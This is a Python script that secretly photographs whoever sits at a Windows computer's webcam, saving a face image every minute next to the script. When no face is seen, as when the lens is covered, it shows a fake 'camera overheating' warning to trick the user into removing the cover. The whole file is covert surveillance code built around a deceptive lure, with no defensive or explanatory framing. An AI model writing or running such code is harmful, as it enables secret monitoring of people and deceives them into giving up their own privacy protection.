import cv2
import ctypes
import os
import time
import numpy as np

# Function to display a message box
def show_message_box(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x00000010)

# Function to capture an image from the camera
def capture_image(image_count):
    # Use OpenCV to capture an image from the camera
    camera = cv2.VideoCapture(0)
    ret, frame = camera.read()
    if ret:
        # Check if the image contains colors
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        _, threshold = cv2.threshold(gray, 1, 255, cv2.THRESH_BINARY)
        if np.any(threshold):
            # Save the captured image in the same folder as the Python file
            script_dir = os.path.dirname(os.path.abspath(__file__))
            image_name = f"captured_image_{image_count}.jpg"
            image_path = os.path.join(script_dir, image_name)
            cv2.imwrite(image_path, frame)
            return image_path
    return None

# Function to detect faces in the image using OpenCV
def detect_faces(image):
    # Load the pre-trained face cascade classifier
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

    # Convert the image to grayscale
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

    # Detect faces in the grayscale image
    faces = face_cascade.detectMultiScale(gray, 1.3, 5)

    return len(faces) > 0

# Main loop
image_count = 1
while True:
    # Capture an image from the camera
    image_path = capture_image(image_count)

    if image_path:
        # Load the captured image
        image = cv2.imread(image_path)

        # Detect faces in the image
        if detect_faces(image):
            # Increment the image count for the next capture
            image_count += 1

            # Wait for 1 minute before capturing the next image
            time.sleep(60)
        else:
            # Display a message box indicating that no face was detected
            show_message_box("camara overheating" , "your camara is overheating please remove any cover that covers you camara before it will harm your computer.")

            # Remove the captured image file
            os.remove(image_path)